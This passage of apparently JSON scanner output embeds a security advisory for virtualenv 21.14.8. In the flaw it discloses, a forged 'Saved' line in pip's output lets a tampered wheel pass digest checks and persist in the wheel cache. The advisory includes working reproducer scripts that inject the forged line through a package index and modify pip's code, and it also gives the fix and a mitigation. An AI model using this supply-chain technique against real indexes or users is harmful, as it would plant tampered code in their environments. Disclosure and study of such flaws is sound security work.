              "fullDescription": {
                "markdown": "## Summary\n\nWheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual\noutput. A verification failure does not remove the downloaded file from that cache.\n\nAnthropic's OSS Scanner reported this as `ANT-2026-ST00DRO3` in `virtualenv-20261015-005`, received on 15 October 2026.\n\n## Affected area\n\nDownload selection and promotion into the reusable wheel cache.\n\n## Attacker-controlled input\n\nA download must fail verification, or the archive selected from pip output must differ from the file later reused.\nDefault-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI\ncomparison.\n\n## Affected code\n\nThe relevant 21.14.8 source is in\n[wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py).\n\n## Mechanism\n\n`download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash\nfrom the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can\ninject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the\nforged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain\nthere. Later wheel selection does not hash the cached file again.\n\n## Reproduction and evidence\n\nThe scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. In the control case\nit served a modified pip wheel alone. `virtualenv --upgrade-embed-wheels` refused the mismatch, and a subsequent\nenvironment used the bundled pip. In the attack case the index added a link whose `data-requires-python` contained a\nforged `Saved \u003cpath\u003e` line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded\nthe modified wheel in its update log, and a later environment's `pip --version` ran a line added by the index. The\nreproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant.\n\nThe report also shows that a refused wheel can replace a previously accepted file of the same name in `wheel/house`,\nleaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The\ngap follows the digest check added in #3251, first released in 21.7.12.\n[PR #3430](https://github.com/pypa/virtualenv/pull/3430) downloads to a private temporary directory, verifies the actual\narchive, and promotes it only after acceptance.\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant I as Configured index\n    participant P as pip download\n    participant C as wheel/house cache\n    participant V as virtualenv digest check\n    participant N as New environment\n    I-\u003e\u003eP: modified wheel and forged Saved line\n    P-\u003e\u003eC: write modified wheel directly\n    P--\u003e\u003eV: stdout names genuine bundled wheel\n    V-\u003e\u003eV: hash genuine wheel and accept\n    V-\u003e\u003eC: record modified wheel for reuse\n    C-\u003e\u003eN: seed modified pip without rehash\n    Note over P,C: Even a rejected wheel can remain in the cache\n```\n\n## Reproducer files\n\nThe following files are from the scanner report for `ANT-2026-ST00DRO3`. They were tested against commit `a857a7823c73`\nin the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\nneed a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\nare included as evidence and were not rerun for this advisory update.\n\n**`repro`**\n\n```text\n#!/usr/bin/env python3\nimport atexit\nimport hashlib\nimport json\nimport os\nimport shutil\nimport subprocess\nimport sys\nfrom pathlib import Path\n\ncompanions = Path(\"/tmp/repro.d\")\nwork = Path(\"/tmp/forged-saved-line\")\nhome = work / \"home\"\napp_data = home / \".cache\" / \"virtualenv\"\nthis_python = f\"{sys.version_info.major}.{sys.version_info.minor}\"  # the target; each Python has its own update log\nupdate_log_of_pip = app_data / \"wheel\" / this_python / \"embed\" / \"3\" / \"pip.json\"\nvirtualenv = [sys.executable, companions / \"virtualenv_with_local_pypi_json.py\", work / \"pypi\"]\nas_user = {\"cwd\": home, \"env\": {\"HOME\": str(home), \"PATH\": os.environ[\"PATH\"]}, \"capture_output\": True, \"text\": True}\nadded_code_prints = \"code added by the index\"  # the line index_serves_modified_pip.py adds to pip/__init__.py\n\n\ndef user_upgrades_seed_wheels_and_creates_env():\n    # each case starts from an empty app-data\n    shutil.rmtree(app_data, ignore_errors=True)\n    shutil.rmtree(home / \"env\", ignore_errors=True)\n    upgrade = subprocess.run([*virtualenv, \"--upgrade-embed-wheels\"], **as_user)\n    # --no-periodic-update: the background update is another process, which the PyPI stand-in does not reach\n    subprocess.run([*virtualenv, \"--no-periodic-update\", \"env\"], **as_user, check=True)\n    pip_version = subprocess.run([home / \"env\" / \"bin\" / \"python\", \"-m\", \"pip\", \"--version\"], **as_user, check=True)\n    # one thread per target Python; a refused wheel ends its thread with a traceback on stderr, the exit code stays 0\n    refusal = next((line for line in upgrade.stderr.splitlines() if \"but PyPI reports\" in line), None)\n    logged = []\n    if update_log_of_pip.exists():  # a failed update writes no log\n        logged = [entry[\"filename\"] for entry in json.loads(update_log_of_pip.read_text())[\"versions\"]]\n    return refusal, logged, pip_version.stdout.splitlines()\n\n\n# set up: PyPI's answers, a faithful mirror of PyPI on 127.0.0.1:8099, a user whose pip.conf points pip at it\nshutil.rmtree(work, ignore_errors=True)\n(home / \".config\" / \"pip\").mkdir(parents=True)\nshutil.copy(companions / \"pip.conf\", home / \".config\" / \"pip\" / \"pip.conf\")\nsubprocess.run([sys.executable, companions / \"pypi_json_and_mirror.py\", work / \"pypi\", work / \"index\"], check=True)\nindex_server = subprocess.Popen(\n    [sys.executable, \"-u\", \"-m\", \"http.server\", \"8099\", \"--bind\", \"127.0.0.1\", \"--directory\", work / \"index\"],\n    stdout=subprocess.PIPE,\n    stderr=subprocess.DEVNULL,\n    text=True,\n)\natexit.register(index_server.kill)\nassert index_server.stdout.readline().startswith(\"Serving HTTP\"), \"index server did not start\"  # printed once bound\n\n# control: the index serves a modified pip 26.0.1, and virtualenv's comparison with PyPI's SHA-256 refuses it\nsubprocess.run([sys.executable, companions / \"index_serves_modified_pip.py\", work / \"index\"], check=True)\nrefusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\nprint(\"CONTROL  modified pip: --upgrade-embed-wheels refused with:\", refusal)\nprint(\"CONTROL  modified pip: update log of pip lists\", logged)\nprint(\"CONTROL  modified pip: pip --version in the new env prints\", pip_says)\ncontrol_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\n# attack: the index also adds one link, whose data-requires-python puts a \"Saved \u003cpath\u003e\" line into pip's output\nsubprocess.run([sys.executable, companions / \"index_forges_saved_line.py\", work / \"index\"], check=True)\nrefusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\nstored_wheel = app_data / \"wheel\" / \"house\" / \"pip-26.0.1-py3-none-any.whl\"\nstored_sha256 = hashlib.sha256(stored_wheel.read_bytes()).hexdigest()\npypi_sha256 = json.loads((work / \"pypi\" / \"pip.json\").read_text())[\"releases\"][\"26.0.1\"][0][\"digests\"][\"sha256\"]\nprint(\"OBSERVED + forged line: --upgrade-embed-wheels refused with:\", refusal)\nprint(\"OBSERVED + forged line: update log of pip lists\", logged)\nprint(\"OBSERVED + forged line: sha256 of that wheel in wheel/house:\", stored_sha256)\nprint(\"OBSERVED + forged line: sha256 PyPI publishes for that name:\", pypi_sha256)\nprint(\"OBSERVED + forged line: pip --version in the new env prints\", pip_says)\nattack_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\n# check: the same modified wheel, refused without the forged line, is seeded with it\nprint(\"BUG\" if attack_ran_added_code and not control_ran_added_code else \"OK\")\n```\n\n**`repro.d/index_forges_saved_line.py`**\n\n```text\n\"\"\"Attacker, as the operator of the index the user's pip.conf names: make pip print a \"Saved \u003cpath\u003e\" line of its choice.\n\nusage: index_forges_saved_line.py \u003cindex_dir\u003e\n\nAdds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1.\n\"\"\"\n\nimport shutil\nimport sys\nfrom pathlib import Path\n\n# a genuine PyPI file named pip-26.0.1-py3-none-any.whl on the user's disk: the wheel virtualenv bundles for Python 3.9,\n# at the same path for every user of this image\nGENUINE_WHEEL_ON_USERS_DISK = \"/src/src/virtualenv/seed/wheels/embed/pip-26.0.1-py3-none-any.whl\"\n\nindex_dir = Path(sys.argv[1])\n\n# named 100.0 while its METADATA says 26.2.1: pip tries it first, then drops it with\n# \"Discarding \u003clink\u003e (requires-python:\u003cattribute\u003e): ... has inconsistent version\" on stdout\nshutil.copy(index_dir / \"files\" / \"pip-26.2.1-py3-none-any.whl\", index_dir / \"files\" / \"pip-100.0-py3-none-any.whl\")\n\n# pip keeps a link whose data-requires-python it cannot parse, and prints the attribute as written; \u0026#10; is a line feed\nwith (index_dir / \"simple\" / \"pip\" / \"index.html\").open(\"a\") as page:\n    page.write(\n        '\u003ca href=\"/files/pip-100.0-py3-none-any.whl\"'\n        f' data-requires-python=\"\u0026#10;Saved {GENUINE_WHEEL_ON_USERS_DISK}\u0026#10;\"\u003epip-100.0-py3-none-any.whl\u003c/a\u003e\\n'\n    )\n```\n\n**`repro.d/index_serves_modified_pip.py`**\n\n```text\n\"\"\"Attacker, as the operator of the index the user's pip.conf names: serve a modified pip under a genuine name.\n\nusage: index_serves_modified_pip.py \u003cindex_dir\u003e\n\npip 26.0.1 on the index gets one more line of code in pip/__init__.py and becomes the only pip on offer. On its own,\nvirtualenv's comparison with PyPI's SHA-256 catches this.\n\"\"\"\n\nimport hashlib\nimport io\nimport sys\nimport zipfile\nfrom pathlib import Path\n\nADDED_CODE = b'\\nprint(\"code added by the index runs as uid\", __import__(\"os\").getuid())\\n'\n\nindex_dir = Path(sys.argv[1])\nwheel = index_dir / \"files\" / \"pip-26.0.1-py3-none-any.whl\"\n\ngenuine = zipfile.ZipFile(io.BytesIO(wheel.read_bytes()))\nwith zipfile.ZipFile(wheel, \"w\") as modified:\n    for entry in genuine.infolist():\n        content = genuine.read(entry)\n        if entry.filename == \"pip/__init__.py\":\n            content += ADDED_CODE\n        modified.writestr(entry, content)\n\n# the #sha256= that every PyPI link carries matters: --upgrade-embed-wheels copies the bundled pip 26.0.1 into pip's\n# download folder first, and pip replaces a file of the same name there only when the link's digest differs\nsha256 = hashlib.sha256(wheel.read_bytes()).hexdigest()\n(index_dir / \"simple\" / \"pip\" / \"index.html\").write_text(\n    f'\u003c!DOCTYPE html\u003e\\n\u003ca href=\"/files/{wheel.name}#sha256={sha256}\"\u003e{wheel.name}\u003c/a\u003e\\n'\n)\n```\n\n**`repro.d/pip.conf`**\n\n```text\n[global]\nindex-url = http://127.0.0.1:8099/simple\n```\n\n**`repro.d/pypi_json_and_mirror.py`**\n\n```text\n\"\"\"Setup: what PyPI's JSON API answers for the seed wheels, and an index that mirrors PyPI faithfully.\n\nusage: pypi_json_and_mirror.py \u003cpypi_dir\u003e \u003cindex_dir\u003e\n\nThe wheels bundled with virtualenv are genuine PyPI files. \u003cpypi_dir\u003e/\u003cproject\u003e.json is what\nhttps://pypi.org/pypi/\u003cproject\u003e/json answers for them, with the digests of virtualenv's BUNDLE_SHA256 table.\n\u003cindex_dir\u003e is a PEP 503 tree (simple/\u003cproject\u003e/index.html, files/) that offers exactly these files.\n\"\"\"\n\nimport json\nimport shutil\nimport sys\nimport zipfile\nfrom email.parser import HeaderParser\nfrom html import escape\nfrom pathlib import Path\n\nfrom virtualenv.seed.wheels.embed import BUNDLE_FOLDER, BUNDLE_SHA256\n\npypi_dir, index_dir = Path(sys.argv[1]), Path(sys.argv[2])\npypi_dir.mkdir()\n(index_dir / \"files\").mkdir(parents=True)\n\nfor project in (\"pip\", \"setuptools\"):\n    releases, links = {}, []\n    for filename, sha256 in BUNDLE_SHA256.items():\n        name, version = filename.split(\"-\")[:2]\n        if name != project:\n            continue\n        shutil.copy(BUNDLE_FOLDER / filename, index_dir / \"files\")\n        releases[version] = [{\"filename\": filename, \"digests\": {\"sha256\": sha256}, \"upload_time\": \"2026-01-01T00:00:00\"}]\n        with zipfile.ZipFile(BUNDLE_FOLDER / filename) as wheel:\n            metadata = HeaderParser().parsestr(wheel.read(f\"{name}-{version}.dist-info/METADATA\").decode())\n        requires_python = escape(metadata[\"Requires-Python\"])\n        links.append(f'\u003ca href=\"/files/{filename}#sha256={sha256}\" data-requires-python=\"{requires_python}\"\u003e{filename}\u003c/a\u003e')\n    (pypi_dir / f\"{project}.json\").write_text(json.dumps({\"releases\": releases}))\n    (index_dir / \"simple\" / project).mkdir(parents=True)\n    (index_dir / \"simple\" / project / \"index.html\").write_text(\"\u003c!DOCTYPE html\u003e\\n\" + \"\\n\".join(links) + \"\\n\")\n```\n\n**`repro.d/virtualenv_with_local_pypi_json.py`**\n\n```text\n\"\"\"Setup: the virtualenv command line, with PyPI's JSON API answered from local files because there is no network.\n\nusage: virtualenv_with_local_pypi_json.py \u003cpypi_dir\u003e \u003cvirtualenv arguments...\u003e\n\nOnly the request for https://pypi.org/pypi/\u003cproject\u003e/json is replaced: it is answered from \u003cpypi_dir\u003e/\u003cproject\u003e.json.\npip, the index pip talks to and the rest of virtualenv are the real thing.\n\"\"\"\n\nimport sys\nfrom pathlib import Path\nfrom unittest import mock\n\nfrom virtualenv.__main__ import run_with_catch\n\npypi_dir = Path(sys.argv[1])\n\n\ndef pypi_json_api(url, context):\n    assert url.startswith(\"https://pypi.org/pypi/\") and context is None, url\n    project = url.split(\"/\")[4]\n    return (pypi_dir / f\"{project}.json\").open(\"rb\")\n\n\nwith mock.patch(\"virtualenv.seed.wheels.periodic_update.urlopen\", pypi_json_api):\n    run_with_catch(sys.argv[2:])\n```\n\n## Impact\n\nA file rejected during download verification can remain available for later cache selection. Exploitation requires\nadditional control over the downloaded data or archive selection; this finding alone does not bypass TLS.\n\nSeverity: low.\n\n## Versions tested\n\nThe confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\nversion or exclude earlier releases. Fixed in 21.14.9.\n\nThe fix downloads into a private temporary directory and verifies archive identity, requested version, digest\nwhere applicable, and Python compatibility before promoting a wheel into the reusable cache.\n\nFix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\n## Known mitigation\n\nAfter a failed verification, discard that download cache before reusing it. Use embedded wheels while reviewing\nunexpected download failures.\n\n## Affected release\n\n- [x] The problem reproduces on virtualenv 21.14.8.\n\n## Credits\n\nReported by Anthropic's OSS Scanner as ANT-2026-ST00DRO3.",
                "text": "## Summary\n\nWheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual\noutput. A verification failure does not remove the downloaded file from that cache.\n\nAnthropic's OSS Scanner reported this as `ANT-2026-ST00DRO3` in `virtualenv-20261015-005`, received on 15 October 2026.\n\n## Affected area\n\nDownload selection and promotion into the reusable wheel cache.\n\n## Attacker-controlled input\n\nA download must fail verification, or the archive selected from pip output must differ from the file later reused.\nDefault-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI\ncomparison.\n\n## Affected code\n\nThe relevant 21.14.8 source is in\n[wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py).\n\n## Mechanism\n\n`download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash\nfrom the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can\ninject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the\nforged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain\nthere. Later wheel selection does not hash the cached file again.\n\n## Reproduction and evidence\n\nThe scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. In the control case\nit served a modified pip wheel alone. `virtualenv --upgrade-embed-wheels` refused the mismatch, and a subsequent\nenvironment used the bundled pip. In the attack case the index added a link whose `data-requires-python` contained a\nforged `Saved \u003cpath\u003e` line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recorded\nthe modified wheel in its update log, and a later environment's `pip --version` ran a line added by the index. The\nreproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant.\n\nThe report also shows that a refused wheel can replace a previously accepted file of the same name in `wheel/house`,\nleaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. The\ngap follows the digest check added in #3251, first released in 21.7.12.\n[PR #3430](https://github.com/pypa/virtualenv/pull/3430) downloads to a private temporary directory, verifies the actual\narchive, and promotes it only after acceptance.\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant I as Configured index\n    participant P as pip download\n    participant C as wheel/house cache\n    participant V as virtualenv digest check\n    participant N as New environment\n    I-\u003e\u003eP: modified wheel and forged Saved line\n    P-\u003e\u003eC: write modified wheel directly\n    P--\u003e\u003eV: stdout names genuine bundled wheel\n    V-\u003e\u003eV: hash genuine wheel and accept\n    V-\u003e\u003eC: record modified wheel for reuse\n    C-\u003e\u003eN: seed modified pip without rehash\n    Note over P,C: Even a rejected wheel can remain in the cache\n```\n\n## Reproducer files\n\nThe following files are from the scanner report for `ANT-2026-ST00DRO3`. They were tested against commit `a857a7823c73`\nin the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\nneed a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\nare included as evidence and were not rerun for this advisory update.\n\n**`repro`**\n\n```text\n#!/usr/bin/env python3\nimport atexit\nimport hashlib\nimport json\nimport os\nimport shutil\nimport subprocess\nimport sys\nfrom pathlib import Path\n\ncompanions = Path(\"/tmp/repro.d\")\nwork = Path(\"/tmp/forged-saved-line\")\nhome = work / \"home\"\napp_data = home / \".cache\" / \"virtualenv\"\nthis_python = f\"{sys.version_info.major}.{sys.version_info.minor}\"  # the target; each Python has its own update log\nupdate_log_of_pip = app_data / \"wheel\" / this_python / \"embed\" / \"3\" / \"pip.json\"\nvirtualenv = [sys.executable, companions / \"virtualenv_with_local_pypi_json.py\", work / \"pypi\"]\nas_user = {\"cwd\": home, \"env\": {\"HOME\": str(home), \"PATH\": os.environ[\"PATH\"]}, \"capture_output\": True, \"text\": True}\nadded_code_prints = \"code added by the index\"  # the line index_serves_modified_pip.py adds to pip/__init__.py\n\n\ndef user_upgrades_seed_wheels_and_creates_env():\n    # each case starts from an empty app-data\n    shutil.rmtree(app_data, ignore_errors=True)\n    shutil.rmtree(home / \"env\", ignore_errors=True)\n    upgrade = subprocess.run([*virtualenv, \"--upgrade-embed-wheels\"], **as_user)\n    # --no-periodic-update: the background update is another process, which the PyPI stand-in does not reach\n    subprocess.run([*virtualenv, \"--no-periodic-update\", \"env\"], **as_user, check=True)\n    pip_version = subprocess.run([home / \"env\" / \"bin\" / \"python\", \"-m\", \"pip\", \"--version\"], **as_user, check=True)\n    # one thread per target Python; a refused wheel ends its thread with a traceback on stderr, the exit code stays 0\n    refusal = next((line for line in upgrade.stderr.splitlines() if \"but PyPI reports\" in line), None)\n    logged = []\n    if update_log_of_pip.exists():  # a failed update writes no log\n        logged = [entry[\"filename\"] for entry in json.loads(update_log_of_pip.read_text())[\"versions\"]]\n    return refusal, logged, pip_version.stdout.splitlines()\n\n\n# set up: PyPI's answers, a faithful mirror of PyPI on 127.0.0.1:8099, a user whose pip.conf points pip at it\nshutil.rmtree(work, ignore_errors=True)\n(home / \".config\" / \"pip\").mkdir(parents=True)\nshutil.copy(companions / \"pip.conf\", home / \".config\" / \"pip\" / \"pip.conf\")\nsubprocess.run([sys.executable, companions / \"pypi_json_and_mirror.py\", work / \"pypi\", work / \"index\"], check=True)\nindex_server = subprocess.Popen(\n    [sys.executable, \"-u\", \"-m\", \"http.server\", \"8099\", \"--bind\", \"127.0.0.1\", \"--directory\", work / \"index\"],\n    stdout=subprocess.PIPE,\n    stderr=subprocess.DEVNULL,\n    text=True,\n)\natexit.register(index_server.kill)\nassert index_server.stdout.readline().startswith(\"Serving HTTP\"), \"index server did not start\"  # printed once bound\n\n# control: the index serves a modified pip 26.0.1, and virtualenv's comparison with PyPI's SHA-256 refuses it\nsubprocess.run([sys.executable, companions / \"index_serves_modified_pip.py\", work / \"index\"], check=True)\nrefusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\nprint(\"CONTROL  modified pip: --upgrade-embed-wheels refused with:\", refusal)\nprint(\"CONTROL  modified pip: update log of pip lists\", logged)\nprint(\"CONTROL  modified pip: pip --version in the new env prints\", pip_says)\ncontrol_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\n# attack: the index also adds one link, whose data-requires-python puts a \"Saved \u003cpath\u003e\" line into pip's output\nsubprocess.run([sys.executable, companions / \"index_forges_saved_line.py\", work / \"index\"], check=True)\nrefusal, logged, pip_says = user_upgrades_seed_wheels_and_creates_env()\nstored_wheel = app_data / \"wheel\" / \"house\" / \"pip-26.0.1-py3-none-any.whl\"\nstored_sha256 = hashlib.sha256(stored_wheel.read_bytes()).hexdigest()\npypi_sha256 = json.loads((work / \"pypi\" / \"pip.json\").read_text())[\"releases\"][\"26.0.1\"][0][\"digests\"][\"sha256\"]\nprint(\"OBSERVED + forged line: --upgrade-embed-wheels refused with:\", refusal)\nprint(\"OBSERVED + forged line: update log of pip lists\", logged)\nprint(\"OBSERVED + forged line: sha256 of that wheel in wheel/house:\", stored_sha256)\nprint(\"OBSERVED + forged line: sha256 PyPI publishes for that name:\", pypi_sha256)\nprint(\"OBSERVED + forged line: pip --version in the new env prints\", pip_says)\nattack_ran_added_code = added_code_prints in \"\\n\".join(pip_says)\n\n# check: the same modified wheel, refused without the forged line, is seeded with it\nprint(\"BUG\" if attack_ran_added_code and not control_ran_added_code else \"OK\")\n```\n\n**`repro.d/index_forges_saved_line.py`**\n\n```text\n\"\"\"Attacker, as the operator of the index the user's pip.conf names: make pip print a \"Saved \u003cpath\u003e\" line of its choice.\n\nusage: index_forges_saved_line.py \u003cindex_dir\u003e\n\nAdds one link to the page of pip; the file behind it is a renamed copy of the genuine pip 26.2.1.\n\"\"\"\n\nimport shutil\nimport sys\nfrom pathlib import Path\n\n# a genuine PyPI file named pip-26.0.1-py3-none-any.whl on the user's disk: the wheel virtualenv bundles for Python 3.9,\n# at the same path for every user of this image\nGENUINE_WHEEL_ON_USERS_DISK = \"/src/src/virtualenv/seed/wheels/embed/pip-26.0.1-py3-none-any.whl\"\n\nindex_dir = Path(sys.argv[1])\n\n# named 100.0 while its METADATA says 26.2.1: pip tries it first, then drops it with\n# \"Discarding \u003clink\u003e (requires-python:\u003cattribute\u003e): ... has inconsistent version\" on stdout\nshutil.copy(index_dir / \"files\" / \"pip-26.2.1-py3-none-any.whl\", index_dir / \"files\" / \"pip-100.0-py3-none-any.whl\")\n\n# pip keeps a link whose data-requires-python it cannot parse, and prints the attribute as written; \u0026#10; is a line feed\nwith (index_dir / \"simple\" / \"pip\" / \"index.html\").open(\"a\") as page:\n    page.write(\n        '\u003ca href=\"/files/pip-100.0-py3-none-any.whl\"'\n        f' data-requires-python=\"\u0026#10;Saved {GENUINE_WHEEL_ON_USERS_DISK}\u0026#10;\"\u003epip-100.0-py3-none-any.whl\u003c/a\u003e\\n'\n    )\n```\n\n**`repro.d/index_serves_modified_pip.py`**\n\n```text\n\"\"\"Attacker, as the operator of the index the user's pip.conf names: serve a modified pip under a genuine name.\n\nusage: index_serves_modified_pip.py \u003cindex_dir\u003e\n\npip 26.0.1 on the index gets one more line of code in pip/__init__.py and becomes the only pip on offer. On its own,\nvirtualenv's comparison with PyPI's SHA-256 catches this.\n\"\"\"\n\nimport hashlib\nimport io\nimport sys\nimport zipfile\nfrom pathlib import Path\n\nADDED_CODE = b'\\nprint(\"code added by the index runs as uid\", __import__(\"os\").getuid())\\n'\n\nindex_dir = Path(sys.argv[1])\nwheel = index_dir / \"files\" / \"pip-26.0.1-py3-none-any.whl\"\n\ngenuine = zipfile.ZipFile(io.BytesIO(wheel.read_bytes()))\nwith zipfile.ZipFile(wheel, \"w\") as modified:\n    for entry in genuine.infolist():\n        content = genuine.read(entry)\n        if entry.filename == \"pip/__init__.py\":\n            content += ADDED_CODE\n        modified.writestr(entry, content)\n\n# the #sha256= that every PyPI link carries matters: --upgrade-embed-wheels copies the bundled pip 26.0.1 into pip's\n# download folder first, and pip replaces a file of the same name there only when the link's digest differs\nsha256 = hashlib.sha256(wheel.read_bytes()).hexdigest()\n(index_dir / \"simple\" / \"pip\" / \"index.html\").write_text(\n    f'\u003c!DOCTYPE html\u003e\\n\u003ca href=\"/files/{wheel.name}#sha256={sha256}\"\u003e{wheel.name}\u003c/a\u003e\\n'\n)\n```\n\n**`repro.d/pip.conf`**\n\n```text\n[global]\nindex-url = http://127.0.0.1:8099/simple\n```\n\n**`repro.d/pypi_json_and_mirror.py`**\n\n```text\n\"\"\"Setup: what PyPI's JSON API answers for the seed wheels, and an index that mirrors PyPI faithfully.\n\nusage: pypi_json_and_mirror.py \u003cpypi_dir\u003e \u003cindex_dir\u003e\n\nThe wheels bundled with virtualenv are genuine PyPI files. \u003cpypi_dir\u003e/\u003cproject\u003e.json is what\nhttps://pypi.org/pypi/\u003cproject\u003e/json answers for them, with the digests of virtualenv's BUNDLE_SHA256 table.\n\u003cindex_dir\u003e is a PEP 503 tree (simple/\u003cproject\u003e/index.html, files/) that offers exactly these files.\n\"\"\"\n\nimport json\nimport shutil\nimport sys\nimport zipfile\nfrom email.parser import HeaderParser\nfrom html import escape\nfrom pathlib import Path\n\nfrom virtualenv.seed.wheels.embed import BUNDLE_FOLDER, BUNDLE_SHA256\n\npypi_dir, index_dir = Path(sys.argv[1]), Path(sys.argv[2])\npypi_dir.mkdir()\n(index_dir / \"files\").mkdir(parents=True)\n\nfor project in (\"pip\", \"setuptools\"):\n    releases, links = {}, []\n    for filename, sha256 in BUNDLE_SHA256.items():\n        name, version = filename.split(\"-\")[:2]\n        if name != project:\n            continue\n        shutil.copy(BUNDLE_FOLDER / filename, index_dir / \"files\")\n        releases[version] = [{\"filename\": filename, \"digests\": {\"sha256\": sha256}, \"upload_time\": \"2026-01-01T00:00:00\"}]\n        with zipfile.ZipFile(BUNDLE_FOLDER / filename) as wheel:\n            metadata = HeaderParser().parsestr(wheel.read(f\"{name}-{version}.dist-info/METADATA\").decode())\n        requires_python = escape(metadata[\"Requires-Python\"])\n        links.append(f'\u003ca href=\"/files/{filename}#sha256={sha256}\" data-requires-python=\"{requires_python}\"\u003e{filename}\u003c/a\u003e')\n    (pypi_dir / f\"{project}.json\").write_text(json.dumps({\"releases\": releases}))\n    (index_dir / \"simple\" / project).mkdir(parents=True)\n    (index_dir / \"simple\" / project / \"index.html\").write_text(\"\u003c!DOCTYPE html\u003e\\n\" + \"\\n\".join(links) + \"\\n\")\n```\n\n**`repro.d/virtualenv_with_local_pypi_json.py`**\n\n```text\n\"\"\"Setup: the virtualenv command line, with PyPI's JSON API answered from local files because there is no network.\n\nusage: virtualenv_with_local_pypi_json.py \u003cpypi_dir\u003e \u003cvirtualenv arguments...\u003e\n\nOnly the request for https://pypi.org/pypi/\u003cproject\u003e/json is replaced: it is answered from \u003cpypi_dir\u003e/\u003cproject\u003e.json.\npip, the index pip talks to and the rest of virtualenv are the real thing.\n\"\"\"\n\nimport sys\nfrom pathlib import Path\nfrom unittest import mock\n\nfrom virtualenv.__main__ import run_with_catch\n\npypi_dir = Path(sys.argv[1])\n\n\ndef pypi_json_api(url, context):\n    assert url.startswith(\"https://pypi.org/pypi/\") and context is None, url\n    project = url.split(\"/\")[4]\n    return (pypi_dir / f\"{project}.json\").open(\"rb\")\n\n\nwith mock.patch(\"virtualenv.seed.wheels.periodic_update.urlopen\", pypi_json_api):\n    run_with_catch(sys.argv[2:])\n```\n\n## Impact\n\nA file rejected during download verification can remain available for later cache selection. Exploitation requires\nadditional control over the downloaded data or archive selection; this finding alone does not bypass TLS.\n\nSeverity: low.\n\n## Versions tested\n\nThe confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\nversion or exclude earlier releases. Fixed in 21.14.9.\n\nThe fix downloads into a private temporary directory and verifies archive identity, requested version, digest\nwhere applicable, and Python compatibility before promoting a wheel into the reusable cache.\n\nFix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\n## Known mitigation\n\nAfter a failed verification, discard that download cache before reusing it. Use embedded wheels while reviewing\nunexpected download failures.\n\n## Affected release\n\n- [x] The problem reproduces on virtualenv 21.14.8.\n\n## Credits\n\nReported by Anthropic's OSS Scanner as ANT-2026-ST00DRO3."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-113714](https://osv.dev/CVE-2026-113714)**.\n\n## [GHSA-494p-63j8-28p3](https://osv.dev/GHSA-494p-63j8-28p3)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e Wheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textual\n\u003e output. A verification failure does not remove the downloaded file from that cache.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-ST00DRO3` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Download selection and promotion into the reusable wheel cache.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e A download must fail verification, or the archive selected from pip output must differ from the file later reused.\n\u003e Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI\n\u003e comparison.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e `download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash\n\u003e from the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can\n\u003e inject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the\n\u003e forged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain\n\u003e there. Later wheel selection does not hash the cached file again.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. In the control case\n\u003e it served a modified pip wheel alone. `virtualenv 